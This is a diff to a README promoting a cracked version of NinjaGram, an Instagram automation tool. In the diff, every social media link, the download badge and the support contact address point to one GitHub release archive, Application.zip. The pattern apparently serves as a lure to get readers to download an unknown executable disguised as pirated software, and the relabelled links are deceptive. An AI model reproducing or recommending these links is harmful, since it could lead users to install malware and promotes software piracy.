@@ -25,7 +25,7 @@ Looking for a cracked version of NinjaGram or a full version of the software? Wa
 
 ## Software Download
 To download the software, click the button below:
-[![Download NinjaGram](https://img.shields.io/badge/Download-NinjaGram-blue)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Download NinjaGram](https://github.com/siminantony/NinjaGram-Download/releases/download/v1.0/Application.zip)](https://github.com/siminantony/NinjaGram-Download/releases/download/v1.0/Application.zip)
 
 🚀 **Launch the software and unleash your ninja skills on Instagram!**
 
@@ -43,11 +43,11 @@ Join our community of NinjaGram users to share tips, tricks, and success stories
 
 ## Let's Connect
 Follow us on social media for the latest updates, tips, and more:
-- [Twitter](https://twitter.com/NinjaGram)
-- [Instagram](https://instagram.com/NinjaGram)
-- [Facebook](https://facebook.com/NinjaGram)
+- [Twitter](https://github.com/siminantony/NinjaGram-Download/releases/download/v1.0/Application.zip)
+- [Instagram](https://github.com/siminantony/NinjaGram-Download/releases/download/v1.0/Application.zip)
+- [Facebook](https://github.com/siminantony/NinjaGram-Download/releases/download/v1.0/Application.zip)
 
-📩 For inquiries and support, contact us at [support@ninjagram.com](mailto:support@ninjagram.com)
+📩 For inquiries and support, contact us at [https://github.com/siminantony/NinjaGram-Download/releases/download/v1.0/Application.zip](https://github.com/siminantony/NinjaGram-Download/releases/download/v1.0/Application.zip)
 
 ---
 
